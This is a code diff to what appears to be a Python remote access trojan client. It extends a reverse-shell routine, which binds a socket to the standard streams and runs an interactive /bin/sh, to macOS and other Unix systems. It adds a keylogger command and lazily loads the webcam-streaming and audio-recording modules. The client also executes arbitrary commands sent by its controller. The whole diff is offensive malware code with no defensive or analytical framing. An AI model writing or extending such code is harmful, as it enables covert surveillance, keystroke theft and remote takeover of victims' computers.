@@ -1,7 +1,5 @@
 from client import Client
-from webcam import VideoStream
 from transfer import FileTransfer
-from recorder import Recorder
 import os
 import sys
 import subprocess
@@ -42,7 +40,7 @@ def spawn_shell(s):
 	stdout = os.dup(1)
 	stderr = os.dup(2)
 	
-	if platform.system() == 'Linux':
+	if platform.system() == 'Linux' or platform.system() == 'Darwin':
 		os.dup2(s.fileno(), 0)
 		os.dup2(s.fileno(), 1)
 		os.dup2(s.fileno(), 2)
@@ -55,6 +53,17 @@ def spawn_shell(s):
 		os.close(stderr)
 	elif platform.system() == 'Windows':
 		windows_shell(s)
+	else:
+		os.dup2(s.fileno(), 0)
+		os.dup2(s.fileno(), 1)
+		os.dup2(s.fileno(), 2)
+		subprocess.run(["/bin/sh","-i"])
+		os.dup2(stdin, 0)
+		os.dup2(stdout, 1)
+		os.dup2(stderr, 2)
+		os.close(stdin)
+		os.close(stdout)
+		os.close(stderr)
 
 def parse_command(command):
 	if not command:
@@ -87,6 +96,7 @@ def main():
 				output = ""
 			client.send(output.strip())
 		elif cmd == "webcam":
+			from webcam import VideoStream
 			stream = VideoStream(client)
 			stream.send()
 		elif cmd == "download":
@@ -104,8 +114,13 @@ def main():
 		elif cmd == "shell":
 			spawn_shell(s)
 		elif cmd == "record":
+			from recorder import Recorder
 			recorder = Recorder(client)
 			recorder.record()
+		elif cmd == "keylog":
+			from keylogger import Keylogger
+			keylogger = Keylogger(client)
+			keylogger.record()
 		else:
 			output = subprocess.getoutput(cmd + " " + ' '.join(args))
 			client.send(output)
